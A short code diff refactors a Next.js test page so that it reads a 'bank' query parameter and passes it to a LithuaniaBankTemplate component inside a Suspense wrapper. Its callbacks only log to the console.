@@ -1,12 +1,16 @@
 "use client";
 
+import { useSearchParams } from "next/navigation";
+import { Suspense } from "react";
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
 
-export default function TestLtPage() {
+function Inner() {
+  const sp = useSearchParams();
+  const bankSlug = (sp.get("bank") || "swedbank-lt").toLowerCase();
   return (
     <LithuaniaBankTemplate
-      bankSlug="swedbank-lt"
-      bankName="Swedbank LT"
+      bankSlug={bankSlug}
+      bankName={bankSlug}
       formData={{}}
       onChange={(field, value) => {
         // eslint-disable-next-line no-console
@@ -17,5 +21,13 @@ export default function TestLtPage() {
         console.log("handleRouteAction", data);
       }}
     />
+  );
+}
+
+export default function TestLtPage() {
+  return (
+    <Suspense fallback={null}>
+      <Inner />
+    </Suspense>
   );
 }
